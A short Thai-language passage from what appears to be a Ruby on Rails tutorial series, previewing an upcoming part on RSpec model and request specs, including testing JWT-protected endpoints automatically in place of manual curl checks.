ตอนออกแบบระบบ multi-tenant ที่ต้องแยกสิทธิ์ระหว่าง organization ใน **Phase 14**

**ต่อไป (Part 046 — เปิด Phase 6: Testing (TDD/BDD)):** ตลอด 45 Part ที่ผ่านมา เราเขียนโค้ด
Rails มาไม่น้อย แต่การทดสอบส่วนใหญ่เป็นการรัน server แล้วลองด้วยมือ หรือทดสอบผ่าน `curl`/
`rails console` เท่านั้น — **Phase 6** จะเปลี่ยนวิธีทำงานนี้ไปตลอดกาล เราจะกลับมาใช้ **RSpec**
(ที่เรียนพื้นฐานไปแล้วใน Part 019 บนโปรเจกต์ Ruby ล้วน) แต่คราวนี้ประยุกต์ใช้กับ **Rails
application เต็มรูปแบบ**: เริ่มจาก **model spec** (ทดสอบ validation, association, business
logic ของ ActiveRecord model) และ **request spec** (ทดสอบ HTTP request/response ทั้งกระบวน
การ รวมถึงระบบ authentication ที่เพิ่งเรียนจบใน Phase นี้ด้วย — จะได้เห็นวิธีเขียน test ที่
จำลอง login ผ่าน JWT และทดสอบ protected endpoint แบบอัตโนมัติ แทนการรัน `curl` ด้วยมือแบบที่
ทำมาตลอด Part นี้) จุดเริ่มต้นของวินัยการเขียนโค้ดที่ **พิสูจน์ได้ว่าถูกต้อง** ไม่ใช่แค่ "ดู
เหมือนจะทำงาน"
